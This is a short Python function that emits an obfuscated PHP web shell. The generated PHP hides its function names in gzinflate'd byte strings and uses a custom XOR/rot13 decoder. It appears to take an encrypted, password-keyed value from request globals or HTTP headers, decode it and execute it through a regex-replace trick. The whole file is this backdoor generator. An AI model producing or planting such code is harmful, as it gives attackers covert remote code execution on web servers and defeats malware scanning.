def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
    return """<?php
function dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}

class replace {
    private $hash = "\\xab\\xa8\\xa9\\x00\\xc2\\x78\\x77\\xd7\\x90\\x9a\\xf8\\x00\\xff\\x60\\x20\\xe9\\xec\\xef\\xef\\xed\\xe9\\x5a\\xa3\\x92\\x97\\x98\\x9b\\x6a\\xab\\x12\\x1f\\xec\\x1a\\x14\\xe6\\x1a\\x14\\x0d\\x00\\x8b\\x07\\x00";
    function __construct($var, $srcname, $array = null)
    {
        $this->var = $var;
        $this->name = $srcname;
        $this->cookie = get_class($this);
        if(!is_null($array))
            die((string)new replace($this->var,array($array,$this->name)));
    }
    function __toString(){
        $die = $this->var .= gzinflate(substr($this->hash,-3)).$this->cookie;
        $this->cookie = explode("|",gzinflate(substr($this->hash,0,-3)));
        if(end($this->name) != 6){
            $name = $this->name[0][$this->cookie[end($this->name)]][%s];
        }else{
            $name = $this->cookie[end($this->name)].'HTTP_%s]';
            $die('.*', '\\0',$name,gzinflate("\\xcb\\x4d\\x2d\\x02\\x00"))=="";
        }
        die($die('.*', '\\0',dept($name),gzinflate("\\xcb\\x4d\\x2d\\x02\\x00")));
    }
}
new replace(gzinflate("\\xcb\\x4d\\x4a\\x2d\\x4a\\x4d\\x07\\x00"), %s,$GLOBALS);""" % (salt, passwd, passwd.upper(), keyword)
